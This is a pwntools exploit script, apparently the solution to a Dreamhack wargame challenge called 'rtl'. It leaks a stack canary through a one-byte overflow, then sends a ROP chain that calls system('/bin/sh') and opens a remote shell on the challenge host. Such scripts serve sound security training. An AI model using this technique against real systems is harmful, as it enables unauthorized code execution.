from pwn import *

exe = ELF('rtl', checksec=False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 17418)

payload = b'a'*(0x40 - 0x8 + 0x1)
r.sendafter(b'Buf: ', payload)
r.recvuntil(b'a'*(0x40 - 0x8))
canary_fake = u64(r.recv(8))
log.info("canary fake:" + hex(canary_fake))
canary = canary_fake - 0x61
log.info("canary :" + hex(canary))

pop_rdi = 0x0000000000400853
ret = 0x0000000000400285
payload = b'a'*(0x40 - 0x8)
payload += p64(canary)
payload += b'a'*8
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rdi) + p64(next(exe.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(exe.sym['system'])
r.sendafter(b'Buf: ', payload)

r.interactive()